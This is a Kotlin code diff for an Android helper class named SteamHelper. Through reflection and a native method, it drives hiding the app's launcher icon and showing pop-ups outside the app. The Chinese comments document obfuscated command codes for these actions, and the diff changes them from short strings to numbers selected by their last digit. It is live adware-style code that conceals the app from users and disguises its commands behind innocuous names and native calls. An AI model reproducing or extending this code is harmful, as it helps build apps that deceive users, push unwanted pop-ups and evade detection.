@@ -19,8 +19,8 @@ object SteamHelper {
     fun init(context: Context) {
         MMKV.initialize(context)
         arrayList.add(context)
-        arrayList.add("nf")
-        arrayList.add("gi")
+        arrayList.add("44")
+        arrayList.add("8888")
         runCatching {
             val clazz = Class.forName("com.water.soak.SteamHelper")
             val conClazz = Class.forName("android.content.Context")
@@ -36,17 +36,17 @@ object SteamHelper {
 
     //参数cmd传字符串:字符串包含"hc"隐藏图标,包含"ci"恢复隐藏.包含"qz"外弹(外弹在主进程主线程调用).
     //参数num:"nf"隐藏图标,"lk"恢复隐藏."gi"外弹(外弹在主进程主线程调用).
+    //参数num%10==4隐藏图标,num%10==2恢复隐藏.num%10==8外弹(外弹在主进程主线程调用).
+
     @JvmStatic
-    external fun lakeStr(string: String, boolean: Boolean): String
+    external fun lakeStr(int: Int): Boolean
 
     // 隐藏2 外弹是 3
     @JvmStatic
     fun getFlagByString(type: String): Int {
-        runCatching {
-            val clazz = Class.forName("com.water.soak.SteamHelper")
-            clazz.getMethod("lakeStr", String::class.java, Boolean::class.java)
-                .invoke(null, "${arrayList[type.toInt()]}", true)
-        }
+        val clazz = Class.forName("com.water.soak.SteamHelper")
+        clazz.getMethod("lakeStr", Int::class.java)
+            .invoke(null, "${arrayList[type.toInt()]}".toInt())
         return type.toInt()
     }
 
